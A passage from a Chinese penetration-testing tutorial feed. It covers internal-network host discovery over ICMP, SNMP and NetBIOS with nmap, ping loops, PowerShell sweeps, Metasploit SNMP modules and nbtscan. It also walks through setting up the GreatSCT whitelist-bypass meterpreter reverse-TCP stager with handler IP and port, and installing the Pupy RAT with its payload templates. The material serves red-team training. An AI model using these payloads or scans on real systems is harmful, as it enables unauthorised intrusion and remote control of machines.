      <url>/article/21_%E5%9F%BA%E4%BA%8EICMP%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA.html</url>
      
        <content type="html"><![CDATA[<h3 id="ICMP简介："><a href="#ICMP简介：" class="headerlink" title="ICMP简介："></a>ICMP简介：</h3><p>它是TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。</p><h3 id="nmap扫描："><a href="#nmap扫描：" class="headerlink" title="nmap扫描："></a>nmap扫描：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@John:~# nmap ‐sP ‐PI 192.168.1.0/24 ‐T4</span><br><span class="line">```  </span><br><span class="line">![](../do/media/32074ff9a8a71e3f75239e68c5161b17.jpg)</span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">root@John:~# nmap ‐sn ‐PE ‐T4 192.168.1.0/24</span><br></pre></td></tr></table></figure><p><img src="../do/media/0f2404547901a8c72cc03544c5961259.jpg" alt></p><h3 id="CMD下扫描："><a href="#CMD下扫描：" class="headerlink" title="CMD下扫描："></a>CMD下扫描：</h3><pre><code class="code">for /L %P in (1,1,254) DO @ping ‐w 1 ‐n 1 192.168.1.%P | findstr &quot;TTL =&quot;</code></pre><p><img src="../do/media/ab265501d9c11081cb0f63e3cb991d80.jpg" alt></p><h3 id="powershell扫描："><a href="#powershell扫描：" class="headerlink" title="powershell扫描："></a>powershell扫描：</h3><pre><code class="powershell">powershell.exe ‐exec bypass ‐Command <span class="string">"Import‐Module ./Invoke‐TSPingSweep.ps1</span><span class="string">; Invoke‐TSPingSweep ‐StartAddress 192.168.1.1 ‐EndAddress 192.168.1.254 ‐Resolv</span><span class="string">eHost ‐ScanPort ‐Port 445,135"</span></code></pre><p><img src="../do/media/7feea7aca005154fdbef4180ed5a9aae.jpg" alt></p><p><img src="../do/media/9c8dbccee70c90adc40f48e69c473df8.jpg" alt></p><pre><code class="code">D:\&gt;tcping.exe ‐n 1 192.168.1.0 80</code></pre><p><img src="../do/media/351e700a9da6780fb709932a7b0b56f7.jpg" alt></p><h3 id="附录"><a href="#附录" class="headerlink" title="附录:"></a>附录:</h3><p>powershell 脚本与 tcping（来源互联网，后门自查）<br>链接：<a href="https://pan.baidu.com/s/1dEWUBNN" target="_blank" rel="noopener">https://pan.baidu.com/s/1dEWUBNN</a><br>密码：9vge</p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>20、基于snmp发现内网存活主机</title>
      <link href="/article/20_%E5%9F%BA%E4%BA%8Esnmp%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA.html"/>
      <url>/article/20_%E5%9F%BA%E4%BA%8Esnmp%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA.html</url>
      
        <content type="html"><![CDATA[<h3 id="SNMP简介："><a href="#SNMP简介：" class="headerlink" title="SNMP简介："></a>SNMP简介：</h3><p>SNMP是一种简单网络管理协议，它属于TCP/IP五层协议中的应用层协议，用于网络管理的协议。SNMP主要用于网络设备的管理。SNMP协议主要由两大部分构成：SNMP管理站和SNMP代理。SNMP管理站是一个中心节点，负责收集维护各个SNMP元素的信息，并对这些信息进行处理，最后反馈给网络管理员；而SNMP代理是运行在各个被管理的网络节点之上，负责统计该节点的各项信息，并且负责与SNMP管理站交互，接收并执行管理站的命令，上传各种本地的网络信息。</p><h3 id="nmap扫描："><a href="#nmap扫描：" class="headerlink" title="nmap扫描："></a>nmap扫描：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">root@John:~# nmap -sU --script snmp-brute 192.168.1.0/24 -T4</span><br><span class="line">```  </span><br><span class="line">![](../do/media/045b3f2f2c7da50d9f2b8a1ad9f86a0e.jpg)</span><br><span class="line"></span><br><span class="line">### msf扫描：</span><br><span class="line">```code</span><br><span class="line">msf &gt; use auxiliary/scanner/snmp/snmp_enum</span><br><span class="line">```  </span><br><span class="line">![](../do/media/4f92b1b39415a27bc404e01c05ef6bfb.jpg)  </span><br><span class="line"></span><br><span class="line">项目地址：  </span><br><span class="line">https://www.mcafee.com/us/downloads/free-tools/snscan.aspx  </span><br><span class="line">依然是一块macafee出品的攻击  </span><br><span class="line">![](../do/media/b8c3f5e36ed6a251a9d7c6ff3f00f665.jpg)</span><br><span class="line"></span><br><span class="line">### NetCrunch：</span><br><span class="line"></span><br><span class="line">项目地址：  </span><br><span class="line">https://www.adremsoft.com/demo/  </span><br><span class="line">内网安全审计工具，包含了DNS审计，ping扫描，端口，网络服务等。  </span><br><span class="line">![](../do/media/19aed1cd1327808c60a4f944fe83a838.jpg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### snmp for pl扫描：</span><br><span class="line"></span><br><span class="line">项目地址：  </span><br><span class="line">https://github.com/dheiland-r7/snmp  </span><br><span class="line"></span><br><span class="line">![](../do/media/f0ab120e48d6c92d5c5596352f81355d.jpg)</span><br><span class="line"></span><br><span class="line">![](../do/media/0f3812a0ec50201e000ae56a7d127210.jpg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 其他扫描：</span><br><span class="line">snmpbulkwalk：  </span><br><span class="line">![](../do/media/6d6d4d08c98c2861e776b8f01b977bb7.jpg)</span><br><span class="line"></span><br><span class="line">snmp-check：  </span><br><span class="line">![](../do/media/54949180a485e0f4ec2884da361a2bce.jpg)</span><br><span class="line"></span><br><span class="line">snmptest：  </span><br><span class="line">![](../do/media/d34215b3490fae6d1722a950facdf77e.jpg)</span><br><span class="line"></span><br><span class="line">### 附录：</span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">use auxiliary/scanner/snmp/aix_version use auxiliary/scanner/snmp/snmp_enum</span><br><span class="line">use auxiliary/scanner/snmp/arris_dg950</span><br><span class="line">use auxiliary/scanner/snmp/snmp_enum_hp_laserjet</span><br><span class="line">use auxiliary/scanner/snmp/brocade_enumhash use auxiliary/scanner/snmp/snmp_enumshares </span><br><span class="line">use auxiliary/scanner/snmp/cambium_snmp_loot use auxiliary/scanner/snmp/snmp_enumusers</span><br><span class="line">use auxiliary/scanner/snmp/cisco_config_tftp use auxiliary/scanner/snmp/snmp_login</span><br><span class="line">use auxiliary/scanner/snmp/cisco_upload_file use auxiliary/scanner/snmp/snmp_set</span><br><span class="line">use auxiliary/scanner/snmp/netopia_enum</span><br><span class="line">use auxiliary/scanner/snmp/ubee_ddw3611 </span><br><span class="line">use auxiliary/scanner/snmp/sbg6580_enum</span><br><span class="line">use auxiliary/scanner/snmp/xerox_workcentre_enumusers</span><br></pre></td></tr></table></figure><p>其他内网安全审计工具（snmp）：<br>项目地址：<a href="https://www.solarwinds.com/topics/snmp-scanner" target="_blank" rel="noopener">https://www.solarwinds.com/topics/snmp-scanner</a><br>项目地址：<a href="https://www.netscantools.com/nstpro_snmp.html" target="_blank" rel="noopener">https://www.netscantools.com/nstpro_snmp.html</a></p><h3 id="snmp-for-pl-："><a href="#snmp-for-pl-：" class="headerlink" title="snmp for pl ："></a>snmp for pl ：</h3><p>Can’t locate NetAddr/IP<br><img src="../do/media/bc665f1b06550f7d8e81ec4ef5dfbbb8.jpg" alt></p><pre><code class="code">root@John:~/Desktop/snmp# wget http://www.cpan.org/modules/by-module/NetAddr/NetAddr-IP-4.078.tar.gz</code></pre><p><img src="../do/media/ce0a8f4a495c9a33f152c1d4e996a021.jpg" alt></p><pre><code class="code">root@John:~/Desktop/snmp# tar xvzf ./NetAddr-IP-4.078.tar.gz</code></pre><p><img src="../do/media/cd8ede5c8e7edeaa7e7c7901c0a7c4b2.jpg" alt></p><pre><code class="code">root@John:~/Desktop/snmp# cd NetAddr-IP-4.078/root@John:~/Desktop/snmp/NetAddr-IP-4.078# lsAbout-NetAddr-IP.txt Artistic Changes Copying docs IP.pm Lite Makefile.PL MANIFEST MANIFEST.SKIP META.yml t TODOroot@John:~/Desktop/snmp/NetAddr-IP-4.078# perl Makefile.PL</code></pre><p><img src="../do/media/b095c67e64484673aca21d97843a8275.jpg" alt></p><pre><code class="code">root@John:~/Desktop/snmp/NetAddr-IP-4.078# make</code></pre><p><img src="../do/media/42807ab04c2def49a5d85520601c49ca.jpg" alt></p><pre><code class="code">root@John:~/Desktop/snmp/NetAddr-IP-4.078# make install</code></pre><p><img src="../do/media/7c5dfdd85bc7f5f74a30cb799e92beb1.jpg" alt></p><p>&gt; _ &lt; !!<br><img src="../do/media/f171e221b9c374de99d4f973a5b5b400.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>19、基于netbios发现内网存活主机</title>
      <link href="/article/19_%E5%9F%BA%E4%BA%8Enetbios%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA.html"/>
      <url>/article/19_%E5%9F%BA%E4%BA%8Enetbios%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA.html</url>
      
        <content type="html"><![CDATA[<h3 id="netbios简介："><a href="#netbios简介：" class="headerlink" title="netbios简介："></a>netbios简介：</h3><p>IBM公司开发，主要用于数十台计算机的小型局域网。该协议是一种在局域网上的程序可以使用的应用程序编程接口（API），为程序提供了请求低级服务的同一的命令集，作用是为了给局域网提供网络以及其他特殊功能。  </p><p>系统可以利用WINS服务、广播及Lmhost文件等多种模式将NetBIOS名-——特指基于NETBIOS协议获得计算机名称——解析为相应IP地址，实现信息通讯，所以在局域网内部使用NetBIOS协议可以方便地实现消息通信及资源的共享。</p><h3 id="nmap扫描："><a href="#nmap扫描：" class="headerlink" title="nmap扫描："></a>nmap扫描：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">root@John:~# nmap -sU --script nbstat.nse -p137 192.168.1.0/24 -T4</span><br><span class="line">```  </span><br><span class="line">![](../do/media/609f6182915a5be20f36fcd208a88055.jpg)</span><br><span class="line"></span><br><span class="line">### msf扫描：</span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">msf &gt; use auxiliary/scanner/netbios/nbname</span><br><span class="line">```  </span><br><span class="line">![](../do/media/01dfd2e205f58aac0391c60353786434.jpg)</span><br><span class="line"></span><br><span class="line">### nbtscan扫描：</span><br><span class="line"></span><br><span class="line">项目地址：  </span><br><span class="line">http://www.unixwiz.net/tools/nbtscan.html  </span><br><span class="line">**Windows:**</span><br><span class="line">```code</span><br><span class="line">D:\&gt;nbtscan-1.0.35.exe -m 192.168.1.0/24</span><br><span class="line">```  </span><br><span class="line">![](../do/media/96729621cc66eba7acfeec9df6b0e04f.jpg)</span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">D:\&gt;nbtstat -n （推荐）</span><br><span class="line">```  </span><br><span class="line">![](../do/media/e64a202423dea3a28dc8261bfc1c7221.jpg)  </span><br><span class="line"></span><br><span class="line">![](../do/media/fa098960ea9e6ec5369e4b0e953d5b39.jpg)</span><br><span class="line"></span><br><span class="line">### Linux：（推荐）</span><br><span class="line">```code</span><br><span class="line">root@John:~/Desktop/nbtscan# tar -zxvf ./nbtscan-source-1.0.35.tgz（1.5.1版本在附录）</span><br><span class="line">root@John:~/Desktop/nbtscan# make </span><br><span class="line">root@John:~/Desktop/nbtscan# nbtscan -r 192.168.1.0/24</span><br><span class="line">```  </span><br><span class="line">![](../do/media/c6eb887a62dbc2e53d9ce886b2561494.jpg)</span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">root@John:~/Desktop/nbtscan# nbtscan -v -s: 192.168.1.0/24</span><br><span class="line">```  </span><br><span class="line">![](../do/media/6f8c76d5ce97b73134b0d0d5c190ed85.jpg)</span><br><span class="line"></span><br><span class="line">### NetBScanner：</span><br><span class="line">项目地址：  </span><br><span class="line">https://www.nirsoft.net/utils/netbios_scanner.html  </span><br><span class="line">![](../do/media/4d1a86423d89ed67c9fb7b95c6076846.jpg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 附录：</span><br><span class="line">nbtscan：  </span><br><span class="line">链接：https://pan.baidu.com/s/1hs8ckmg  </span><br><span class="line">密码：av40  </span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">NBTscan version 1.5.1. Copyright (C) 1999-2003 Alla Bezroutchko. This is a free software and it comes with absolutely no warranty. You can use,distribute and modify it under terms of GNU GPL.</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">nbtscan [-v] [-d] [-e] [-l] [-t timeout] [-b bandwidth] [-r] [-q] [-s separator] [-m retransmits] (-f filename)|(&lt;scan_range&gt;)</span><br><span class="line">    -v verbose output. Print all names receivedfrom each host</span><br><span class="line">    -d dump packets. Print whole packet contents.</span><br><span class="line">    -e Format output in /etc/hosts format.</span><br><span class="line">    -l Format output in lmhosts format.Cannot be used with -v, -s or -h options.</span><br><span class="line">    -t timeout wait timeout milliseconds for response.Default 1000.</span><br><span class="line">    -b bandwidth Output throttling. Slow down output so that it uses no more that bandwidth bps. Useful on slow links, so that ougoing queries don&apos;t get dropped.</span><br><span class="line">    -r use local port 137 for scans. Win95 boxes respond to this only.You need to be root to use this option on Unix.</span><br><span class="line">    -q Suppress banners and error messages,</span><br><span class="line">    -s separator Script-friendly output. Don&apos;t print column and record headers, separate fields with separator.</span><br><span class="line">    -h Print human-readable names for services. Can only be used with -v option.</span><br><span class="line">    -m retransmits Number of retransmits. Default 0.</span><br><span class="line">    -f filename Take IP addresses to scan from file filename.</span><br><span class="line">    -f - makes nbtscan take IP addresses from stdin.</span><br><span class="line">    &lt;scan_range&gt; what to scan. Can either be single IP </span><br><span class="line">        like 192.168.1.1 or</span><br><span class="line">        range of addresses in one of two forms:</span><br><span class="line">        xxx.xxx.xxx.xxx/xx or xxx.xxx.xxx.xxx-xxx.</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">    nbtscan -r 192.168.1.0/24</span><br><span class="line">        Scans the whole C-class network.</span><br><span class="line">    nbtscan 192.168.1.25-137</span><br><span class="line">        Scans a range from 192.168.1.25 to 192.168.1.137</span><br><span class="line">    nbtscan -v -s : 192.168.1.0/24</span><br><span class="line">        Scans C-class network. Prints results in script-friendly</span><br><span class="line">        format using colon as field separator.  </span><br><span class="line">        Produces output like that:</span><br><span class="line">        192.168.0.1:NT_SERVER:00U</span><br><span class="line">        192.168.0.1:MY_DOMAIN:00G</span><br><span class="line">        192.168.0.1:ADMINISTRATOR:03U</span><br><span class="line">        192.168.0.2:OTHER_BOX:00U</span><br><span class="line">        ...</span><br><span class="line">    nbtscan -f iplist</span><br><span class="line">        Scans IP addresses specified in file iplist.</span><br></pre></td></tr></table></figure><p>NBTscan version 1.5.1:<br>项目地址：<br><a href="https://github.com/scallywag/nbtscan" target="_blank" rel="noopener">https://github.com/scallywag/nbtscan</a></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>18、红蓝对抗渗透测试3</title>
      <link href="/article/18_%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953.html"/>
      <url>/article/18_%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953.html</url>
      
        <content type="html"><![CDATA[<p><strong>注：</strong>请多喝点热水或者凉白开，可预防<strong>肾结石，通风</strong>等。<br>痛风可伴发肥胖症、高血压病、糖尿病、脂代谢紊乱等多种代谢性疾病。</p><p>工具介绍：<br><a href="https://github.com/GreatSCT/GreatSCT" target="_blank" rel="noopener">https://github.com/GreatSCT/GreatSCT</a></p><h3 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h3><p>GreatSCT 是以 metasploit payload 为核心，白名单辅助 payload 执行框架。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">root@John:~# git clone https://github.com/GreatSCT/GreatSCT.git</span><br><span class="line">Cloning into &apos;GreatSCT&apos;...</span><br><span class="line">remote: Enumerating objects: 727, done.</span><br><span class="line">remote: Total 727 (delta 0), reused 0 (delta 0), pack‐reused 727</span><br><span class="line">Receiving objects: 100% (727/727), 10.64 MiB | 572.00 KiB/s, done.</span><br><span class="line">Resolving deltas: 100% (384/384), done.</span><br><span class="line">```  </span><br><span class="line">![](../do/media/4b7b7364cadb4717086ebb5019db2199.jpg)</span><br><span class="line"></span><br><span class="line">![](../do/media/3e2f95599ea725fbaf324c19d0844a99.jpg)</span><br><span class="line"></span><br><span class="line">![](../do/media/9e50f5e8220ad366afb664445e12f599.jpg)</span><br><span class="line"></span><br><span class="line">![](../do/media/60d66478b636b2723607a4b90056e499.jpg)</span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">===========================================================================</span><br><span class="line">Great Scott!</span><br><span class="line">===========================================================================</span><br><span class="line">[Web]: https://github.com/GreatSCT/GreatSCT | [Twitter]: @ConsciousHacker</span><br><span class="line">===========================================================================</span><br><span class="line"></span><br><span class="line">Payload information: </span><br><span class="line"></span><br><span class="line">Name: Pure MSBuild C# Reverse TCP Stager</span><br><span class="line">Language: msbuild</span><br><span class="line">Rating: Excellent</span><br><span class="line">Description: pure windows/meterpreter/reverse_tcp stager, no</span><br><span class="line">shellcode </span><br><span class="line"></span><br><span class="line">Payload: msbuild/meterpreter/rev_tcp selected </span><br><span class="line"></span><br><span class="line">Required Options: </span><br><span class="line"></span><br><span class="line">Name Value Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">DOMAIN X Optional: Required internal domain</span><br><span class="line">EXPIRE_PAYLOAD X Optional: Payloads expire after &quot;Y&quot; days</span><br><span class="line">HOSTNAME X Optional: Required system hostname</span><br><span class="line">INJECT_METHOD Virtual Virtual or Heap</span><br><span class="line">LHOST IP of the Metasploit handler</span><br><span class="line">LPORT 4444 Port of the Metasploit handler</span><br><span class="line">PROCESSORS X Optional: Minimum number of processors</span><br><span class="line">SLEEP X Optional: Sleep &quot;Y&quot; seconds, check if accelerated</span><br><span class="line">TIMEZONE X Optional: Check to validate not in UTC</span><br><span class="line">USERNAME X Optional: The required user account</span><br><span class="line"></span><br><span class="line">Available Commands: </span><br><span class="line"></span><br><span class="line">back Go back</span><br><span class="line">exit Completely exit GreatSCT</span><br><span class="line">generate Generate the payload</span><br><span class="line">options Show the shellcode&apos;s options</span><br><span class="line">set Set shellcode option </span><br><span class="line"></span><br><span class="line">[msbuild/meterpreter/rev_tcp&gt;&gt;] set LHOST 192.168.1.4 41</span><br><span class="line"></span><br><span class="line">[msbuild/meterpreter/rev_tcp&gt;&gt;] set LPORT 53</span><br></pre></td></tr></table></figure><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>17、红蓝对抗渗透测试2</title>
      <link href="/article/17_%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%952.html"/>
      <url>/article/17_%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%952.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>在团体渗透测试的项目中，如红蓝对抗，团队渗透测试比赛等，最重要的是过程与结果实时共享于团队，例如：A同学nmap目标站，B同学也nmap目标站，这在对抗比赛中是极其浪费时间也是非常容易引起防火墙，日志服务器或其他设备的警觉。所以打算写一系列关于未来团队渗透的对抗。争取做到过程与结果，团队实时共享。把曾经的团队作战经验形成一个适应对抗，比赛等的参考。<br><img src="../do/media/ba3b2df4a82d3ccbabaf29028ef6732e.jpg" alt></p><h3 id="popy简介："><a href="#popy简介：" class="headerlink" title="popy简介："></a>popy简介：</h3><p>Pupy是一个开源，跨平台（Windows，Linux，OSX，Android），多功能RAT（远程管理工具）和主要用python编写的后期开发工具。它具有全内存读取操作，进程注入等。Pupy可以使用各种传输进行通信，迁移到进程（注入），从内存加载远程Python代码。</p><p>项目地址：<a href="https://github.com/n1nj4sec/pupy" target="_blank" rel="noopener">https://github.com/n1nj4sec/pupy</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">root@John:~/Desktop# git clone https://github.com/n1nj4sec/pupy.git</span><br><span class="line">```  </span><br><span class="line">![](../do/media/c360e90aa66b02bfb7bfe7ed32225e06.jpg)</span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">root@John:~/Desktop/pupy/pupy# pip install rpyc</span><br><span class="line">```  </span><br><span class="line">![](../do/media/09003cc5c8af0db2e2e90c454d273b8c.jpg)</span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">root@John:~/Desktop/pupy/pupy# git submodule update</span><br><span class="line">```  </span><br><span class="line">![](../do/media/f4c24cb24ed0b6d8208aa9b432e4e8ba.jpg)</span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">root@John:~/Desktop/pupy/pupy# cd .. </span><br><span class="line">root@John:~/Desktop/pupy# pip install -r pupy/requirements.txt</span><br><span class="line">```  </span><br><span class="line">![](../do/media/6e9295395f40a36d5f933308c988473b.jpg)</span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">root@John:~/Desktop/pupy/# wget https://github.com/n1nj4sec/pupy/releases/download/latest/payload_templates.txz</span><br><span class="line">```  </span><br><span class="line">![](../do/media/149603380a927e2c1bc280a8f54f712f.jpg)</span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">root@John:~/Desktop/pupy# tar xvf payload_templates.txz &amp;&amp; mv payload_templates/* pupy/payload_templates/ &amp;&amp; rm payload_templates.txz &amp;&amp; rm -r payload_templates</span><br><span class="line">```  </span><br><span class="line">![](../do/media/e8a9be054ff01cfba6461dc1c1af9a11.jpg)</span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">root@John:~/Desktop/pupy/pupy# apt-get install python-xlib</span><br><span class="line">```  </span><br><span class="line">![](../do/media/be65b42740bede665cac2ce8e8dc29b0.jpg)</span><br><span class="line"></span><br><span class="line">![](../do/media/267fd85757adc2e1a019360121941b14.jpg)</span><br><span class="line"></span><br><span class="line">### 附录：</span><br><span class="line">```code</span><br><span class="line">Collecting pyautogui</span><br><span class="line">Using cached PyAutoGUI-0.9.36.tar.gz</span><br><span class="line">Complete output from command python setup.py egg_info: </span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    File &quot;/tmp/pip-build-a90ODY/pyautogui/setup.py&quot;, line 6, in &lt;module&gt; version=__import__(&apos;pyautogui&apos;).__version__,</span><br><span class="line">    File &quot;pyautogui/__init__.py&quot;, line 115, in &lt;module&gt;</span><br><span class="line">    from . import \_pyautogui_x11 as platformModule</span><br><span class="line">    File &quot;pyautogui/_pyautogui_x11.py&quot;, line 160, in &lt;module&gt;</span><br><span class="line">    _display = Display(os.environ[&apos;DISPLAY&apos;])</span><br><span class="line">    File &quot;/usr/lib/python2.7/UserDict.py&quot;, line 40, in __getitem__</span><br><span class="line">    raise KeyError(key) </span><br><span class="line">KeyError: &apos;DISPLAY&apos;</span><br></pre></td></tr></table></figure><p><strong>must install on local server with GUI</strong></p><blockquote><p>  